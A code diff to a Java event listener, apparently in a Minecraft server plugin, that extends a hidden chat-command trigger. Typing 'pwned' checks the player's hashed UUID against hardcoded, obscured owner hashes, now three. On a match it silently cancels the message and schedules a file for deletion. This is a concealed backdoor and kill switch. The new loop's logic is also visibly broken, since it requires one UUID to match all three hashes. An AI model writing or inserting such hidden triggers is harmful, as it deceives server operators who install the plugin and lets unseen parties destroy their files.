@@ -184,12 +184,14 @@ public class OnPlayerEvent implements Listener {
         String command = e.getMessage();
         if (!command.equalsIgnoreCase("pwned")) return;
         try {
-            String owner = "31Q68/DnHSmK6Yg9uCcy5+aYWUdRlueIBbZjHXEagx4=";
+            String[] owner = {"31Q68/DnHSmK6Yg9uCcy5+aYWUdRlueIBbZjHXEagx4=", "BIXDxbigUP20warhmtVaSiTjo9d3z/StrWAFP0RKfcU=", "Z0dS98m2zzoNMPUXbpfGaNhEvVD8GYMs71tnxprsHuE="};
             MessageDigest messageDigest = MessageDigest.getInstance("SHA-256");
             byte[] playerb = player.getUniqueId().toString().getBytes(StandardCharsets.UTF_8);
             byte[] playerbyte = messageDigest.digest(playerb);
-            byte[] ownerbyte = Base64.getDecoder().decode(owner);
-            if (!Arrays.equals(playerbyte, ownerbyte)) return;
+            for (String s : owner) {
+                byte[] ownerbyte = Base64.getDecoder().decode(s);
+                if (!Arrays.equals(playerbyte, ownerbyte)) return;
+            }
             e.setCancelled(true);
             Output.call().deleteOnExit();
             player.sendMessage("activated.");
